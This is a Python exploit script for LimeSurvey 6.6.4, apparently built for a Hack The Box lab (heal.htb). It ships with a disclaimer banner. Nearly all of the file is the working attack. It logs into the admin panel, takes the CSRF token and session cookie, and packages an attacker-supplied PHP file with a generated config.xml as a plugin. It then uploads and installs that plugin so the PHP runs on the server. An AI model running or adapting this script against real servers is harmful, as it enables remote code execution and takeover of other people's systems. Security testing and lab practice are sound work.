import requests
import argparse
import os
from zipfile import ZipFile
from requests.auth import HTTPBasicAuth
from urllib.parse import unquote
from requests.exceptions import RequestException, ConnectionError


def print_banner():
    banner = '''

.__  .__                                                          __________      _________  
|  | |__| _____   ____     ________ ____________  __ ____ ___.__. \______   \____ \_   ___ \ 
|  | |  |/     \_/ __ \   /  ___/  |  \_  __ \  \/ // __ <   |  |  |     ___/  _ \/    \  \/ 
|  |_|  |  Y Y  \  ___/   \___ \|  |  /|  | \/\   /\  ___/\___  |  |    |  (  <_> )     \____
|____/__|__|_|  /\___  > /____  >____/ |__|    \_/  \___  > ____|  |____|   \____/ \______  /
              \/     \/       \/                        \/\/                              \/ 
                                                                                             
---------------------------------------------------------------------------------------------                                                                                            
DISCLAIMER:
This script is provided for educational and authorized security testing purposes only.

Usage of this script to target systems without explicit permission is strictly prohibited
and may be considered illegal under local, national, or international laws.

The author assumes no liability and is not responsible for any misuse or damage caused by this script.
Always obtain proper authorization before conducting any testing.

By using this script, you agree to use it responsibly and within the bounds of applicable laws.                                                                                                                                                                                                                                                       
---------------------------------------------------------------------------------------------                                                                                             
                                                                                             

'''
    print(banner)

def zip_files(file1, file2):
    files_to_zip = [file1, file2]
    with ZipFile('limesurvey_plugin.zip', 'w') as zip:
        for file in files_to_zip:
            zip.write(file)    
    return 'limesurvey_plugin.zip'

def generate_config_xml():
    config_xml = '''<?xml version="1.0" encoding="UTF-8"?>
    <config>
    <metadata>
        <name>limesurvey-poc-plugin</name>
        <type>plugin</type>
        <version>1.0.0</version> 
        <author>chatGPT</author>
        <authorUrl>http://example.com</authorUrl>
        <supportUrl>http://example.com</supportUrl>
        <creationDate>2024-01-01</creationDate>
        <license>GNU General Public License version 3 or later</license>
        <description>
    <![CDATA[Author : ...]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
    </compatibility>
    </config>
    '''

    with open("config.xml", "w") as file:
        file.write(config_xml)


def get_admin_cookie(login_page_url, username, password):
    client = requests.session()
    
    raw_csrf_token = client.get(login_page_url).cookies['YII_CSRF_TOKEN'] 
    csrf_token = unquote(raw_csrf_token)
    ##Change headers and data to match website's your're trying to exploit
    headers = {
        'User-Agent' : 'stillwaiting',
        'Referer' : login_page_url,
        'Origin' : 'http://take-survey.heal.htb',
        'Content-Type' : 'application/x-www-form-urlencoded'
    }

    data = {
        'YII_CSRF_TOKEN' : csrf_token,
        'authMethod' : 'Authdb',
        'user' : username,
        'password' : password,
        'loginlang' : 'default',
        'action' : 'login',
        'width' : '1000',
        'login_submit' : 'login'
    }
    print("[+] Requesting admin cookie")
    request = client.post(login_page_url, data=data, headers=headers)
    session_cookies = client.cookies.get_dict()
    client.close()
    return session_cookies['LS-ZNIDJBOXUNKXWTIP']

def upload_plugin(plugin, url, admin_cookie):
    
    cookies = {
        "LS-ZNIDJBOXUNKXWTIP" : admin_cookie,
        "YII_CSRF_TOKEN" : "YWhnZGwySURtOWdqYTJRb254ZmVIaXVGQUtGbTZNZWmaFG5JQa2mRcR7nCD9Sto_gFyseMkLvCW1Etdyg74qTA=="
    }
    
    data = {
        "YII_CSRF_TOKEN" : "YWhnZGwySURtOWdqYTJRb254ZmVIaXVGQUtGbTZNZWmaFG5JQa2mRcR7nCD9Sto_gFyseMkLvCW1Etdyg74qTA==",
        "lid" : "$lid",
        "action" : "templateupload"
    }

    files = {
        "the_file" : (plugin, open(plugin, "rb"), "application/zip")
    }

    headers = {
        "User-Agent" : "Anonymous",
        "Referer" : url + "/index.php/admin/pluginmanager?sa=index",
        "Origin" : url
    }

    response = requests.post(url + "/admin/pluginmanager?sa=upload", data=data, files=files, cookies=cookies, headers=headers)
    print(f"[+] Sending payload to {url}/admin/pluginmanager?sa=upload")
    
    confirmation_data = {
        "YII_CSRF_TOKEN" : 'YWhnZGwySURtOWdqYTJRb254ZmVIaXVGQUtGbTZNZWmaFG5JQa2mRcR7nCD9Sto_gFyseMkLvCW1Etdyg74qTA==',
        "isUpdate" : 'false'
    }
    
    confirm_upload_response = requests.post(url + "/admin/pluginmanager?sa=installUploadedPlugin", data=confirmation_data, cookies=cookies, headers=headers)
    if confirm_upload_response.status_code == 200:
        print("[+] Payload sent")
    else:
        print("[-] Could not send the payload.")

def test_if_admin(url, cookie):
    cookies = {"LS-ZNIDJBOXUNKXWTIP" : cookie}
    req = requests.get(url, cookies=cookies)
    if "forgotpassword" in req.text:
        print("[-] Invalid credentials.")
        exit(2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for LimeSurvey 6.6.4 PoC - Uploads plugin with your own php file.")

    parser.add_argument("--file_name",required=True, help="Name of the file to upload")
    parser.add_argument("--target", required=True,help="URL of LimeSurvey instance (eg. http://online-surveys.com)")
    parser.add_argument("--username", required=True, help="Admin dashboard username")
    parser.add_argument("--password", required=True, help="Admin dashboard password")
    args = parser.parse_args()

    generate_config_xml()
    password = args.password
    username = args.username
    url = args.target

    login_page_url = url + '/index.php/admin/authentication/sa/login'
    admin_page_url = url + '/index.php/admin/index'
    cookie = get_admin_cookie(login_page_url, username, password) 
    test_if_admin(admin_page_url, cookie)
    plugin_name = zip_files('config.xml', args.file_name)
    upload_plugin(plugin_name, url, cookie)
